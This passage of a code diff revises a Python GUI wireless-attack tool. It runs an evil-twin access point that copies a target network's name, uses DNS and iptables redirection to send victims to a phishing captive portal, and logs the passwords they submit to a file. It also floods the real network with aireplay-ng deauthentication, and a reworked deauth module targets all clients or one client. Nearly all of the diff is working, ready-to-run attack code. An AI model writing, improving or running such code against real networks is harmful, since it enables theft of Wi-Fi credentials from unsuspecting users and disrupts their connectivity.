-            cred_log = os.path.join(session_dir, "credentials.log")
+            cred_log = os.path.abspath(os.path.join(session_dir, "credentials.log"))
+            
+            # Servidor HTTP Multi-hilo protegido contra bucles (IGUAL A RASPI.PY)
             capture_script = f'''#!/usr/bin/env python3
-import http.server, urllib.parse, os, socketserver
+import http.server, urllib.parse, os
 from datetime import datetime
+
 LOG = "{cred_log}"
 
-class Handler(http.server.SimpleHTTPRequestHandler):
+class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        if self.path == "/" or self.path == "/index.html":
+        parsed_path = urllib.parse.urlparse(self.path)
+        
+        if parsed_path.query:
+            try:
+                params = urllib.parse.parse_qs(parsed_path.query)
+                with open(LOG, "a") as f: 
+                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
+                    f.flush(); os.fsync(f.fileno())
+            except: pass
+
+        if parsed_path.path == "/":
             self.path = "/index.html"
-        return http.server.SimpleHTTPRequestHandler.do_GET(self)
-    
+            
+        local_path = self.translate_path(self.path)
+        
+        if not os.path.isfile(local_path):
+            if self.path == "/index.html":
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"<html><body><h2>Error de Servidor: index.html no existe.</h2></body></html>")
+                return
+                
+            self.send_response(302)
+            self.send_header("Location", "http://10.0.0.1/index.html")
+            self.end_headers()
+            return
+            
+        return super().do_GET()
+
     def do_POST(self):
-        length = int(self.headers.get("Content-Length", 0))
-        data = self.rfile.read(length).decode()
-        params = urllib.parse.parse_qs(data)
-        with open(LOG, "a") as f:
-            f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} Data:{{params}}\\n")
+        try:
+            length = int(self.headers.get("Content-Length", 0))
+            data = self.rfile.read(length).decode("utf-8", "ignore")
+            params = urllib.parse.parse_qs(data)
+            
+            with open(LOG, "a") as f: 
+                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
+                f.flush(); os.fsync(f.fileno())
+        except: pass
+            
         self.send_response(302)
-        self.send_header("Location", "/success.html")
+        self.send_header("Location", "http://10.0.0.1/success.html")
         self.end_headers()
-    
-    def log_message(self, format, *args):
-        pass
+        
+    def log_message(self, format, *args): pass
 
 if __name__ == "__main__":
     os.chdir("{tmp_web}")
-    with socketserver.TCPServer(("0.0.0.0", 80), Handler) as httpd:
+    class ThreadedServer(http.server.ThreadingHTTPServer):
+        allow_reuse_address = True
+        
+    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
         httpd.serve_forever()
 '''
             with open(f"{tmp_web}/capture.py", "w") as f:
                 f.write(capture_script)
-
+                
             if not os.path.exists(f"{tmp_web}/success.html"):
                 with open(f"{tmp_web}/success.html", "w") as f:
-                    f.write('<html><body><h2>Conectado</h2><p>Redirigiendo...</p></body></html>')
+                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana.</p></body></html>')
 
-            # Habilitar IP forwarding
-            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
-
-            # Configurar hostapd
-            hostapd_conf = f"""interface={ap_iface}
-driver=nl80211
-ssid={red['essid']}
-hw_mode=g
-channel={int(red['ch'])}
-macaddr_acl=0
-auth_algs=1
-wpa=0
-ignore_broadcast_ssid=0
-"""
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
+            
             with open("/tmp/hostapd_evil.conf", "w") as f:
                 f.write(hostapd_conf)
-
-            self.escribir_consola("[*] Iniciando hostapd...")
-            self.evil_twin_procs['hostapd'] = subprocess.Popen(
-                ["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
+                
+            self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
+                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(3)
 
-            # Configurar IP en interfaz AP
+            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            time.sleep(1.5) 
 
-            # Configurar dnsmasq
-            dnsmasq_conf = f"""interface={ap_iface}
-bind-interfaces
-dhcp-range=10.0.0.10,10.0.0.250,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
-address=/#/10.0.0.1
-no-hosts
-no-resolv
-"""
+            dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
             with open("/tmp/dnsmasq_evil.conf", "w") as f:
                 f.write(dnsmasq_conf)
-            self.escribir_consola("[*] Iniciando dnsmasq...")
+                
+            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
             self.evil_twin_procs['dnsmasq'] = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(2)
 
-            # Configurar iptables
             subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            subprocess.run(
+                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT",
+                 "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
+            for port in ["80", "53"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            for port in ["53", "67"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
 
-            # Iniciar servidor de captura
-            self.escribir_consola("[*] Iniciando servidor de phishing en puerto 80...")
-            self.evil_twin_procs['capture'] = subprocess.Popen(
-                ["sudo", "python3", f"{tmp_web}/capture.py"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
+            self.evil_twin_procs['capture'] = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
+                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(1)
 
-            # Fijar canal antes de desautenticar
-            subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']],
-                        stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-
-            # Iniciar desautenticación continua
+            subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
             deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
             if deauth_mode == "directed" and cliente_mac:
                 deauth_cmd.extend(["-c", cliente_mac])
             deauth_cmd.append(mon_deauth)
-            self.escribir_consola(f"[*] Iniciando desautenticación continua: {' '.join(deauth_cmd)}")
-            self.evil_twin_procs['deauth'] = subprocess.Popen(
-                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
+            self.evil_twin_procs['deauth'] = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL,
+                                                              stderr=subprocess.DEVNULL)
 
-            # Monitorear credenciales
-            self.escribir_consola("[!] ATAQUE ACTIVO. Presiona 'DETENER ATAQUE' para finalizar.")
             last_lines = 0
             while not self.evil_twin_stop:
                 time.sleep(2)
@@ -1050,25 +1120,30 @@ no-resolv
                         lines = f.readlines()
                         if len(lines) > last_lines:
                             for line in lines[last_lines:]:
-                                self.escribir_consola(f"[+] Credencial: {line.strip()}")
+                                self.escribir_consola(f"[+] Cred: {line.strip()}")
                             last_lines = len(lines)
 
-            # Detener procesos de manera controlada
-            self.escribir_consola("[*] Deteniendo ataque...")
             self._evil_twin_detener_procesos()
             self._evil_twin_limpiar_iptables(ap_iface)
-            self.escribir_consola("[+] Evil Twin detenido y limpiado.")
-            self.after(0, lambda: ctk.CTkLabel(self.main_frame, text="Ataque finalizado.", text_color="green").pack())
+            
+            mon_deauth = self.wifi_state.get("mon_deauth")
+            if mon_deauth:
+                subprocess.run(["sudo", "airmon-ng", "stop", mon_deauth], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            self.escribir_consola("[+] Evil Twin detenido y red restaurada.")
+            self.after(0, self.show_wifi_menu)
 
         self.evil_twin_thread = threading.Thread(target=ataque, daemon=True)
         self.evil_twin_thread.start()
 
-    def _evil_twin_detener(self):
+    def _evil_twin_detener_click(self):
+        if hasattr(self, 'btn_detener_evil') and self.btn_detener_evil.winfo_exists():
+            self.btn_detener_evil.configure(fg_color="#4a4a4a", state="disabled")
+        self.escribir_consola("[*] Deteniendo procesos y restaurando red...")
         self.evil_twin_stop = True
-        self.escribir_consola("[!] Señal de detención enviada...")
 
     def _evil_twin_detener_procesos(self):
-        """Termina los procesos almacenados de manera controlada."""
         for nombre, proc in self.evil_twin_procs.items():
             if proc is not None:
                 try:
@@ -1079,16 +1154,13 @@ no-resolv
                 self.evil_twin_procs[nombre] = None
 
     def _evil_twin_limpiar_procesos(self):
-        """Limpia procesos previos (por si acaso)."""
         self._evil_twin_detener_procesos()
-        # Matar cualquier instancia residual (mejor que pkill genérico)
-        os.system("sudo pkill -f 'hostapd.*evil' 2>/dev/null")
-        os.system("sudo pkill -f 'dnsmasq.*evil' 2>/dev/null")
-        os.system("sudo pkill -f 'capture.py' 2>/dev/null")
-        os.system("sudo pkill -f 'aireplay-ng' 2>/dev/null")
+        subprocess.run(["sudo", "pkill", "-f", "hostapd.*evil"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "pkill", "-f", "dnsmasq.*evil"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "pkill", "-f", "capture.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     def _evil_twin_limpiar_iptables(self, ap_iface):
-        """Restaura iptables y limpia configuraciones."""
         subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
         subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
         subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
@@ -1097,58 +1169,84 @@ no-resolv
             subprocess.run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "yes"], stderr=subprocess.DEVNULL)
         subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)
 
-    # ==========================================
-    # FIN DE MÉTODOS EVIL TWIN
-    # ==========================================
 
+    # ==========================================
+    # 3. DEAUTH (IDÉNTICO A RASPI.PY)
+    # ==========================================
     def _wifi_deauth(self):
         self.limpiar_main_frame()
         self.agregar_boton_atras(self.show_wifi_menu)
-        ctk.CTkLabel(self.main_frame, text="DESAUTENTICACIÓN - Selecciona Interfaz", 
-                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
-        interfaces = self.obtener_interfaces_red()
-        for iface in interfaces:
-            ctk.CTkButton(self.main_frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
-                         command=lambda i=iface: self._deauth_escanear(i)).pack(fill="x", padx=40, pady=5)
+        ctk.CTkLabel(self.main_frame, text="DEAUTH - IFace", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
+        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
+        frame.pack(fill="both", expand=True, padx=20, pady=10)
+        
+        self.deauth_iface_btns = []
+        for iface in self.obtener_interfaces_red():
+            btn = ctk.CTkButton(frame, text=iface, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
+                              command=lambda i=iface: self._deauth_escanear(i))
+            btn.pack(fill="x", pady=5)
+            self.deauth_iface_btns.append(btn)
+                              
         self.mostrar_consola()
 
     def _deauth_escanear(self, iface):
+        for btn in getattr(self, 'deauth_iface_btns', []):
+            if btn.winfo_exists():
+                btn.configure(fg_color="#4a4a4a", state="disabled")
+
         self.wifi_state = {"iface": iface}
-        os.system("sudo airmon-ng check kill >/dev/null 2>&1")
-        os.system(f"sudo airmon-ng start {iface} >/dev/null 2>&1")
-        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
-        self.wifi_state["mon_iface"] = mon
-        self.escribir_consola(f"[*] Escaneando con {mon}...")
+        self.escribir_consola(f"[*] Preparando modo monitor para Deauth en {iface}...")
+        
         scan_prefix = self._generar_nombre_temporal("deauth_scan")
-        os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
-        redes = []
-        try:
-            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
-                for linea in f.read().split("\n")[2:]:
-                    r = linea.split(",")
-                    if len(r) >= 14 and ":" in r[0]:
-                        redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() or "<Oculta>"})
-        except: pass
-        finally:
-            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
-                try:
-                    os.remove(f"{scan_prefix}{ext}")
-                except:
-                    pass
-        self.after(0, lambda: self._deauth_mostrar_redes(redes))
+
+        def escanear():
+            subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
+            self.wifi_state["mon_iface"] = mon
+            
+            self.after(0, lambda: self.escribir_consola(f"[*] Escaneando objetivos..."))
+
+            subprocess.run(f"sudo timeout -k 5 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            redes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    for linea in f.read().split("\n")[2:]:
+                        r = linea.split(",")
+                        if len(r) >= 14 and ":" in r[0]:
+                            redes.append(
+                                {"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() or "<Oculta>"})
+            except: pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+                        
+            self.after(0, lambda: self._deauth_mostrar_redes(redes))
+
+        threading.Thread(target=escanear, daemon=True).start()
 
     def _deauth_mostrar_redes(self, redes):
         self.limpiar_main_frame()
         self.agregar_boton_atras(self._wifi_deauth)
-        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
+        ctk.CTkLabel(self.main_frame, text="SELECCIONA RED", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        if not redes:
+            ctk.CTkLabel(self.main_frame, text="No hay redes.").pack()
+            return
+            
         frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
         frame.pack(fill="both", expand=True, padx=20, pady=10)
+        
         for red in redes:
             texto = f"{red['essid']} (CH:{red['ch']})"
             btn = ctk.CTkButton(frame, text=texto, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
-                               command=lambda r=red: self._deauth_seleccionar_modo(r))
+                              command=lambda r=red: self._deauth_seleccionar_modo(r))
             btn.pack(fill="x", pady=3)
         self.mostrar_consola()
 
@@ -1156,63 +1254,124 @@ no-resolv
         self.wifi_state["target"] = red
         self.limpiar_main_frame()
         self.agregar_boton_atras(self._wifi_deauth)
-        ctk.CTkLabel(self.main_frame, text="MODO DE ATAQUE", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
-        ctk.CTkButton(self.main_frame, text="Broadcast (Todos)", fg_color=COLOR_BOTON_PELIGRO,
-                     command=lambda: self._deauth_ejecutar("FF:FF:FF:FF:FF:FF")).pack(fill="x", padx=40, pady=10)
-        # Opción unicast: escanear clientes
-        ctk.CTkButton(self.main_frame, text="Cliente específico", fg_color=COLOR_BOTON_ROJO,
-                     command=lambda: self._deauth_escanear_clientes(red)).pack(fill="x", padx=40, pady=10)
+        ctk.CTkLabel(self.main_frame, text="MODO DE ATAQUE", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
+        ctk.CTkButton(self.main_frame, text="Broadcast (Todos)", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00",
+                      command=lambda: self._deauth_ejecutar("FF:FF:FF:FF:FF:FF")).pack(fill="x", padx=40, pady=10)
+        ctk.CTkButton(self.main_frame, text="Cliente específico", fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
+                      command=lambda: self._deauth_escanear_clientes(red)).pack(fill="x", padx=40, pady=10)
+                          
         self.mostrar_consola()
 
     def _deauth_escanear_clientes(self, red):
-        mon = self.wifi_state["mon_iface"]
-        scan_prefix = self._generar_nombre_temporal("deauth_clients")
-        os.system(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv >/dev/null 2>&1")
-        clientes = []
-        try:
-            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
-                partes = f.read().split("Station MAC,")
-                if len(partes) > 1:
-                    for linea in partes[1].split("\n")[1:]:
-                        c = linea.split(",")
-                        if len(c) >= 6 and ":" in c[0]:
-                            clientes.append(c[0].strip())
-        except: pass
-        finally:
-            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
-                try:
-                    os.remove(f"{scan_prefix}{ext}")
-                except:
-                    pass
         self.limpiar_main_frame()
         self.agregar_boton_atras(lambda: self._deauth_seleccionar_modo(red))
-        ctk.CTkLabel(self.main_frame, text="SELECCIONA CLIENTE", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
-        if not clientes:
-            ctk.CTkLabel(self.main_frame, text="No hay clientes. Usa Broadcast.").pack()
-            return
-        frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
-        frame.pack(fill="both", expand=True, padx=20, pady=10)
-        for mac in clientes:
-            ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
-                         command=lambda m=mac: self._deauth_ejecutar(m)).pack(fill="x", pady=3)
+        ctk.CTkLabel(self.main_frame, text=f"RASTREANDO MACs\n{red['essid']}", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
         self.mostrar_consola()
+        self.escribir_consola("[*] Escaneando clientes activos en el canal (10s)...")
+
+        def escanear():
+            mon = self.wifi_state["mon_iface"]
+            scan_prefix = self._generar_nombre_temporal("deauth_clients")
+            
+            subprocess.run(
+                f"sudo timeout -k 5 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            clientes = []
+            try:
+                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
+                    partes = f.read().split("Station MAC,")
+                    if len(partes) > 1:
+                        for linea in partes[1].split("\n")[1:]:
+                            c = linea.split(",")
+                            if len(c) >= 6 and ":" in c[0]: 
+                                clientes.append(c[0].strip())
+            except: pass
+            finally:
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    try: os.remove(f"{scan_prefix}{ext}")
+                    except: pass
+
+            def actualizar_gui():
+                self.limpiar_main_frame()
+                self.agregar_boton_atras(lambda: self._deauth_seleccionar_modo(red))
+                ctk.CTkLabel(self.main_frame, text="SELECCIONA CLIENTE", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+                
+                frame = ctk.CTkScrollableFrame(self.main_frame, height=300)
+                frame.pack(fill="both", expand=True, padx=20, pady=10)
+                
+                for mac in clientes:
+                    btn = ctk.CTkButton(frame, text=mac, fg_color="#2b2b2b", hover_color=COLOR_BOTON_HOVER,
+                                      command=lambda m=mac: self._deauth_ejecutar(m))
+                    btn.pack(fill="x", pady=3)
+                self.mostrar_consola()
+
+            self.after(0, actualizar_gui)
+
+        threading.Thread(target=escanear, daemon=True).start()
 
     def _deauth_ejecutar(self, cliente):
         red = self.wifi_state["target"]
         mon = self.wifi_state["mon_iface"]
-        # Ajustar canal antes de desautenticar
-        self.ejecutar_comando(f"sudo iw dev {mon} set channel {red['ch']} 2>/dev/null")
-        # Seleccionar intensidad
+        subprocess.run(["sudo", "iw", "dev", mon, "set", "channel", red['ch']], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        
         self.limpiar_main_frame()
         self.agregar_boton_atras(self._wifi_deauth)
-        ctk.CTkLabel(self.main_frame, text="INTENSIDAD", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10)
+        ctk.CTkLabel(self.main_frame, text="INTENSIDAD", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
         opciones = [("Continuo (0)", "0"), ("1 ráfaga (5)", "5"), ("3 ráfagas (15)", "15")]
         for texto, count in opciones:
-            ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO,
-                        command=lambda c=count: self.ejecutar_comando(
-                            f"sudo aireplay-ng --deauth {c} -a {red['bssid']} -c {cliente} {mon}"
-                        )).pack(fill="x", padx=40, pady=5)
+            ctk.CTkButton(self.main_frame, text=texto, fg_color=COLOR_BOTON_ROJO, hover_color=COLOR_BOTON_HOVER,
+                        command=lambda r=red, c=cliente, cnt=count: self._deauth_ataque_activo(r, c, cnt)).pack(fill="x", padx=40, pady=5)
+                            
         self.mostrar_consola()
+
+    def _deauth_ataque_activo(self, red, cliente, count):
+        mon = self.wifi_state["mon_iface"]
+        self.limpiar_main_frame()
+        self.agregar_boton_atras(lambda: self._deauth_seleccionar_modo(red))
+        ctk.CTkLabel(self.main_frame, text="DEAUTH EN CURSO", font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
+        
+        def detener():
+            if hasattr(self, 'btn_detener_deauth') and self.btn_detener_deauth.winfo_exists():
+                self.btn_detener_deauth.configure(fg_color="#4a4a4a", state="disabled")
+                
+            if hasattr(self, 'deauth_proc') and self.deauth_proc is not None:
+                try:
+                    self.deauth_proc.terminate()
+                    self.deauth_proc.wait(timeout=5)
+                except:
+                    self.deauth_proc.kill()
+                self.deauth_proc = None
+            
+            self.escribir_consola("[+] Ataque deauth detenido. Restaurando red...")
+            def restore():
+                mon_iface = self.wifi_state.get("mon_iface")
+                if mon_iface:
+                    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                self.after(0, self.show_wifi_menu)
+                
+            threading.Thread(target=restore, daemon=True).start()
+        
+        self.btn_detener_deauth = ctk.CTkButton(self.main_frame, text="DETENER DEAUTH", fg_color=COLOR_BOTON_PELIGRO, hover_color="#cc7a00", command=detener)
+        self.btn_detener_deauth.pack(fill="x", padx=40, pady=10)
+        
+        self.mostrar_consola()
+        
+        cmd = ["sudo", "aireplay-ng", "--deauth", count, "-a", red['bssid'], "-c", cliente, mon]
+        self.escribir_consola(f"\nroot@kali:~# {' '.join(cmd)}")
+        
+        def run_attack():
+            self.deauth_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            for line in self.deauth_proc.stdout:
+                self.escribir_consola(line.rstrip())
+            self.deauth_proc.wait()
+            self.escribir_consola("\n[+] Inyección finalizada. Presiona DETENER para salir.")
+            self.deauth_proc = None
+        
+        threading.Thread(target=run_attack, daemon=True).start()
 
     def _wifi_explorar_handshakes(self):
         self._mostrar_explorador_generico(BASE_DIR_WIFI, "CAPTURAS HANDSHAKE", self.show_wifi_menu)
